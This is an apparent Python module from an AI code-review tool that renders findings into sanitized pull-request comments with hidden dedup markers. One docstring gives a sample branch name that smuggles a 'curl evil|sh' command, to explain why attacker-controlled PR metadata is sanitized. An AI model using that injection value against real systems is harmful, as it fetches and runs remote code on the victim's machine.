#!/usr/bin/env python3
"""
Rendering findings into review bodies.

Replaces `render_body.py`. Two differences from v0.5.0 beyond the escaping:

  * Every finding body carries a hidden `<!-- aireview:key=... -->` marker.
    That marker is how the poster reconciles against what is ACTUALLY on the
    pull request before posting. The local dedup store records what we believe
    we posted; the PR records what was really posted. Those diverge whenever a
    run dies between the POST and the store write, whenever a human deletes a
    comment, and whenever the store file is lost - and the store is not the
    authority on any of them.

  * Nothing here interpolates a raw value. Every string arriving from the
    model, the diff or the PR metadata goes through `sanitize`, including file
    paths: they are already validated as members of the PR files list, but
    membership and renderability are different questions.

Stdlib only.
"""
import re

from .sanitize import (
    MAX_EVIDENCE, MAX_HEADLINE, MAX_MESSAGE, MAX_SUMMARY, fenced_block,
    sanitize_code, sanitize_metadata, sanitize_path, sanitize_prose,
)

__all__ = [
    "MARKER_RE", "extract_dedup_key", "marker", "render_finding_comment",
    "render_demoted_section", "render_summary_body",
]

SEVERITY_LABEL = {
    "critical": "critical", "high": "high", "medium": "medium",
    "low": "low", "info": "info",
}
_ORDER = ["critical", "high", "medium", "low", "info"]

# Markers are machine-written and machine-read. The key is restricted to the
# hex-digest alphabet our own `dedup_key` produces, so nothing a model or a
# diff can say ever reaches the marker.
_KEY_OK = re.compile(r"^[A-Za-z0-9_-]{1,64}$")
MARKER_RE = re.compile(r"<!--\s*aireview:key=([A-Za-z0-9_-]{1,64})\s*-->")

FOOTER = "<sub>ai-code-review</sub>"


def marker(dedup_key) -> str:
    """Hidden, stable identity for a posted comment.

    An invalid key yields no marker rather than an unanchored comment: a
    marker we cannot trust is worse than none, because reconciliation would
    then match the wrong thing.
    """
    if isinstance(dedup_key, str) and _KEY_OK.match(dedup_key):
        return f"<!-- aireview:key={dedup_key} -->"
    return ""


def extract_dedup_key(body):
    """Recover the dedup key from a comment body already on the PR."""
    if not isinstance(body, str):
        return None
    m = MARKER_RE.search(body)
    return m.group(1) if m else None


def _severity_of(finding) -> str:
    sev = finding.get("severity")
    return sev if sev in SEVERITY_LABEL else "info"


def render_finding_comment(finding) -> str:
    """One inline review-comment body."""
    sev = _severity_of(finding)
    pid = sanitize_metadata(finding.get("principle_id") or "?", max_chars=64)
    advisory = " · _advisory, not enforced yet_" if finding.get("advisory") else ""

    headline = sanitize_prose(finding.get("headline") or "",
                              max_chars=MAX_HEADLINE)
    message = sanitize_prose(finding.get("message") or "", max_chars=MAX_MESSAGE)
    lead = headline or message

    parts = [f"**`{pid}` · {sev}**{advisory}"]
    if lead:
        parts += ["", lead]
    if headline and message and message != headline:
        parts += ["", message]

    evidence = sanitize_code(finding.get("evidence") or "",
                             max_chars=MAX_EVIDENCE)
    if evidence:
        parts += ["", fenced_block(evidence)]

    if finding.get("dedup_verdict") == "same_finding_resolved":
        parts += ["", "> ⚠️ This finding was previously resolved and has "
                      "regressed."]

    parts += ["", FOOTER]
    mk = marker(finding.get("dedup_key"))
    if mk:
        parts.append(mk)
    return "\n".join(parts)


def _demoted_line(finding) -> str:
    pid = sanitize_metadata(finding.get("principle_id") or "?", max_chars=64)
    sev = _severity_of(finding)
    path = sanitize_path(finding.get("path"))
    line = finding.get("line")
    where = f"`{path}`" if path else "_no file_"
    if path and isinstance(line, int) and not isinstance(line, bool):
        where = f"`{path}`:{line}"
    msg = sanitize_prose(finding.get("headline") or finding.get("message") or "",
                         max_chars=MAX_HEADLINE)
    return f"- `{pid}` · {sev} · {where} — {msg}"


def render_demoted_section(findings, *, heading) -> str:
    """The summary-body section carrying findings that are not inline comments.

    Three things land here: findings GitHub will not accept a position for,
    findings beyond `max_comments`, and - after a 422 - every inline comment
    there was. That last case is why this exists at all: a review must never
    be lost just because one position was rejected.
    """
    if not findings:
        return ""
    out = ["", "---", f"**{heading}**", ""]
    out += [_demoted_line(f) for f in findings]
    return "\n".join(out)


def render_summary_body(
    *,
    repo,
    pr,
    verdict,
    findings,
    summary_markdown="",
    risk=None,
    completeness=None,
    head_sha=None,
    pr_title=None,
    head_ref=None,
) -> str:
    """The review's summary body.

    `pr_title` and `head_ref` are optional and both are attacker-chosen on a
    `pull_request` event, so they go through `sanitize_metadata` like anything
    else. A branch may legally be named ``a";curl evil|sh;#`` - `git
    check-ref-format` permits ';', '&', '$', '|', '(', ')' and backticks.
    """
    counts = {s: 0 for s in _ORDER}
    advisory = 0
    for f in findings:
        if f.get("advisory"):
            advisory += 1
        else:
            counts[_severity_of(f)] += 1

    repo_s = sanitize_metadata(repo or "", max_chars=120)
    pr_n = pr if isinstance(pr, int) and not isinstance(pr, bool) else "?"
    lines = [f"## ai-code-review — {repo_s} #{pr_n}", ""]

    if pr_title:
        lines += [f"_{sanitize_metadata(pr_title)}_", ""]
    if head_ref:
        lines += [f"Branch `{sanitize_path(head_ref)}`", ""]

    band = sanitize_metadata((risk or {}).get("band") or "n/a", max_chars=32)
    lines += [f"**Verdict:** `{sanitize_metadata(verdict or 'comment', max_chars=32)}`"
              f" · **Risk:** `{band}`", ""]
    lines += [" · ".join(f"{s} {counts[s]}" for s in _ORDER)
              + f" · advisory {advisory}"]

    comp = completeness or {}
    warnings = []
    if comp.get("diff_truncated"):
        reason = sanitize_metadata(comp.get("truncation_reason") or
                                   "the diff was truncated")
        warnings.append(f"The diff was **incomplete** ({reason}). Findings "
                        f"below do not cover the whole change.")
    partial = comp.get("partial_dimensions") or []
    if partial:
        named = ", ".join(sanitize_metadata(p, max_chars=40) for p in partial)
        warnings.append(f"These review surfaces did not complete: {named}. "
                        f"Their absence is not evidence of absence.")
    if warnings:
        lines += [""] + [f"> ⚠️ {w}" for w in warnings]

    if summary_markdown:
        lines += ["", sanitize_prose(summary_markdown, max_chars=MAX_SUMMARY)]

    if head_sha:
        lines += ["", f"<sub>Reviewed at "
                      f"`{sanitize_metadata(head_sha, max_chars=40)}`.</sub>"]
    return "\n".join(lines)
